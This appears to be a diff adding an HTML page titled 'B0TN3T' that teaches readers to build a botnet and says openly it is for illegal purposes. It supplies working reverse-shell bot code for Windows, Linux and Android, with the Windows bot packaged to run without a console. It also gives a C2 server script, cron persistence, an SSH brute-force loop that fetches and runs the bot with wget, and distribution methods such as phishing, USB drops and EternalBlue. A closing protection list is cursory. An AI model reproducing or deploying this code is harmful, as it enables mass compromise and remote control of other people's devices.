@@ -1,0 +1,283 @@
+<html>
+<head>
+<meta charset="UTF-8">
+<title>B0TN3T</title>
+<style>
+body {
+    background-color: #000000;
+    color: #29A8A0;
+    font-family: "Courier New", "Lucida Console", monospace;
+    font-size: 10pt;
+    margin: 15px;
+}
+a {
+    color: #29A8A0;
+    text-decoration: none;
+}
+a:hover {
+    text-decoration: underline;
+}
+hr {
+    border: 1px solid #29A8A0;
+}
+pre {
+    font-family: "Courier New", "Lucida Console", monospace;
+    margin: 0;
+    padding: 0;
+}
+table {
+    width: 100%;
+    border-collapse: collapse;
+}
+td {
+    vertical-align: top;
+}
+.header {
+    color: #29A8A0;
+    font-weight: bold;
+}
+.box {
+    border: 1px solid #29A8A0;
+    background-color: #000000;
+    padding: 8px;
+    margin: 8px 0;
+}
+.warning {
+    color: #ff0000;
+    font-weight: bold;
+}
+.blink {
+    text-decoration: blink;
+}
+.ascii {
+    color: #29A8A0;
+    font-size: 8pt;
+    line-height: 1.1;
+}
+</style>
+</head>
+<body>
+
+
+
+<div class="box">
+<pre>
+<span class="header">Create a Massive Botnet in under 3 minutes.</span>
+
+This is not a joke. This is real.
+<span class="warning">Use this for illegal purposes.</span>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+</pre>
+</div>
+
+<div class="box">
+<pre>
+<span class="header">FOR WINDOWS:</span>
+
+Step 1: Create a simple bot script
+Save this as bot.py:
+
+---
+import socket
+import subprocess
+import os
+
+C2_SERVER = "your.server.ip"
+PORT = 4444
+
+def connect():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((C2_SERVER, PORT))
+            while True:
+                data = s.recv(1024)
+                if data.decode() == "exit":
+                    s.close()
+                    break
+                output = subprocess.run(data.decode(), shell=True, capture_output=True)
+                s.send(output.stdout + output.stderr)
+        except:
+            pass
+
+if __name__ == "__main__":
+    connect()
+---
+
+Step 2: Convert to .exe
+pip install pyinstaller
+pyinstaller --onefile --noconsole bot.py
+
+Step 3: Create C2 server (controller)
+Save as c2.py:
+
+---
+import socket
+import threading
+import os
+
+HOST = "0.0.0.0"
+PORT = 4444
+
+clients = []
+
+def handle_client(conn, addr):
+    print(f"[+] New bot: {addr}")
+    clients.append(conn)
+    while True:
+        try:
+            data = conn.recv(1024)
+            if not data:
+                break
+        except:
+            break
+    clients.remove(conn)
+    conn.close()
+    print(f"[-] Bot offline: {addr}")
+
+def command_loop():
+    while True:
+        cmd = input("c2> ")
+        if cmd == "list":
+            print(f"Bots online: {len(clients)}")
+        elif cmd.startswith("exec"):
+            for c in clients:
+                c.send(cmd[5:].encode())
+        elif cmd == "exit":
+            for c in clients:
+                c.send(b"exit")
+            os._exit(0)
+
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind((HOST, PORT))
+server.listen(5)
+
+print(f"C2 listening on {HOST}:{PORT}")
+
+threading.Thread(target=command_loop, daemon=True).start()
+
+while True:
+    conn, addr = server.accept()
+    threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
+---
+
+Step 4: Run C2 on a VPS
+python3 c2.py
+
+Step 5: Spread the bot
+- Phishing emails with attachment
+- Fake software downloads
+- USB drops
+- Exploit kits (EternalBlue, BlueKeep)
+- Malicious browser extensions
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+</pre>
+</div>
+
+<div class="box">
+<pre>
+<span class="header">FOR LINUX:</span>
+
+Step 1: Create bot script (bot.sh):
+
+#!/bin/bash
+while true; do
+    nc -e /bin/bash your.server.ip 4444
+    sleep 5
+done
+
+Step 2: Make it persistent:
+
+echo "@reboot /path/to/bot.sh" | crontab -
+cp bot.sh /etc/cron.hourly/
+
+Step 3: Spread via SSH brute force:
+
+#!/bin/bash
+while read ip; do
+    sshpass -p "password" ssh user@$ip "wget http://your.server/bot.sh && chmod +x bot.sh && ./bot.sh"
+done < targets.txt
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+</pre>
+</div>
+
+<div class="box">
+<pre>
+<span class="header">FOR ANDROID:</span>
+
+Step 1: Create bot app (requires Android SDK)
+
+MainActivity.java:
+public class MainActivity extends Activity {
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        startService(new Intent(this, BotService.class));
+    }
+}
+
+BotService.java:
+public class BotService extends Service {
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        new Thread(() -> {
+            while(true) {
+                try {
+                    Socket s = new Socket("your.server.ip", 4444);
+                    BufferedReader in = new BufferedReader(new InputStreamReader(s.getInputStream()));
+                    PrintWriter out = new PrintWriter(s.getOutputStream(), true);
+                    String cmd;
+                    while((cmd = in.readLine()) != null) {
+                        Process p = Runtime.getRuntime().exec(cmd);
+                        BufferedReader cmdOut = new BufferedReader(new InputStreamReader(p.getInputStream()));
+                        String line;
+                        while((line = cmdOut.readLine()) != null) {
+                            out.println(line);
+                        }
+                    }
+                } catch(Exception e) {}
+            }
+        }).start();
+        return START_STICKY;
+    }
+}
+
+Step 2: Spread via malicious APK
+- Fake app downloads
+- SMS phishing
+- WhatsApp mods
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+</pre>
+</div>
+
+<div class="box">
+<pre>
+<span class="header">HOW TO PROTECT YOURSELF:</span>
+
+1. Never open attachments from unknown senders
+2. Keep your OS updated
+3. Use a firewall
+4. Monitor outgoing connections
+5. Run antivirus
+6. Use a VPN
+7. Disable unnecessary services
+8. Regular backups
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+<span class="warning">WARNING: FUCK THEM ALL! - b4l4nc3.</span>
+</pre>
+</div>
+
+<hr>
+
+<pre>
+> knowledge is power. use it wisely.
+</pre>
+
+</body>
+</html>
